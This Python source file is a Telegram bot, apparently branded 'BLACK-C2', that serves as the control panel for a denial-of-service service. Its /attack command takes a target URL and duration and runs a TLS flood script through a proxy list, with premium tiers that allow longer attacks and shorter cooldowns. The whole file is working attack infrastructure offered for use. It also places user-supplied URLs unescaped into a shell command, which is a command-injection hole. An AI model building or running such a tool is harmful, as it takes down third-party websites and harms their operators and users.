import asyncio
import subprocess
import json
import time
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message

TOKEN = "<bot_token>"
ADMIN_ID = <admin_chaid>
GROUP_USERNAME = "<group_username>"
PREMIUM_USERS_FILE = "premium_users.txt"

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Load premium users safely
def load_premium_users():
    try:
        with open(PREMIUM_USERS_FILE, "r") as f:
            data = f.read().strip()
            return set(json.loads(data) if data else [])
    except (FileNotFoundError, json.JSONDecodeError):
        return set()

# Save premium users
def save_premium_users(users):
    with open(PREMIUM_USERS_FILE, "w") as f:
        json.dump(list(users), f)

premium_users = load_premium_users()

# Track last attack time for each user
last_attack_time = {}

# Check if user is premium
def is_premium(user_id):
    return str(user_id) in premium_users

# Start command
@dp.message(Command("start"))
async def start_cmd(message: Message):
    if message.chat.username == GROUP_USERNAME.lstrip("@"):
        await message.reply("[ >𝘽𝙇𝘼𝘾𝙆-𝘾𝟮 | 𝘽𝙇𝘼𝘾𝙆-𝘾𝟮 ▬▭▬▭▬▭▬▭▬▭▬▭▬ Attack Command\n\n"
                            "/attack ▬▭▬▭▬▭▬▭▬▭▬▭▬ Owner Command\n\n"
                            "/addprem\n\n/delprem ▬▭▬▭▬▭▬▭▬▭▬▭▬ ]")

# Methods command
@dp.message(Command("methods"))
async def methods_cmd(message: Message):
    if message.chat.username == GROUP_USERNAME.lstrip("@"):
        await message.reply("> Available Methods: ▬▭▬▭▬▭▬▭▬▭▬▭▬\n\nTLS ▬▭▬▭▬▭▬▭▬▭▬▭▬")

# Add premium user
@dp.message(Command("addprem"))
async def add_premium(message: Message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = message.text.split()[1]
            premium_users.add(user_id)
            save_premium_users(premium_users)
            await message.reply(f"User {user_id} added as premium.")
        except IndexError:
            await message.reply("Usage: /addprem <user_id>")

# Remove premium user
@dp.message(Command("delprem"))
async def del_premium(message: Message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = message.text.split()[1]
            premium_users.discard(user_id)
            save_premium_users(premium_users)
            await message.reply(f"User {user_id} removed from premium.")
        except IndexError:
            await message.reply("Usage: /delprem <user_id>")

# Attack command
@dp.message(Command("attack"))
async def attack_cmd(message: Message):
    if message.chat.username == GROUP_USERNAME.lstrip("@"):
        user_id = str(message.from_user.id)
        args = message.text.split()
        
        if len(args) != 4 or args[1].upper() != "TLS":
            await message.reply("Usage: /attack TLS <url> <time>")
            return

        url = args[2]
        try:
            time_limit = int(args[3])
        except ValueError:
            await message.reply("Invalid time format.")
            return

        # Check cooldown
        current_time = time.time()
        cooldown = 30 if is_premium(user_id) else 60
        max_time = 120 if is_premium(user_id) else 60

        if user_id in last_attack_time:
            elapsed_time = current_time - last_attack_time[user_id]
            if elapsed_time < cooldown:
                await message.reply(f"Wait {int(cooldown - elapsed_time)} seconds before attacking again.")
                return

        if time_limit > max_time:
            await message.reply(f"Maximum allowed time: {max_time} seconds.")
            return

        # Update last attack time
        last_attack_time[user_id] = current_time

        # Run attack in the background
        command = f"node TLS.js {url} {time_limit} 126 1500 proxy.txt"
        subprocess.Popen(command, shell=True)
        await message.reply(f"Attack started on {url} for {time_limit} seconds.")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())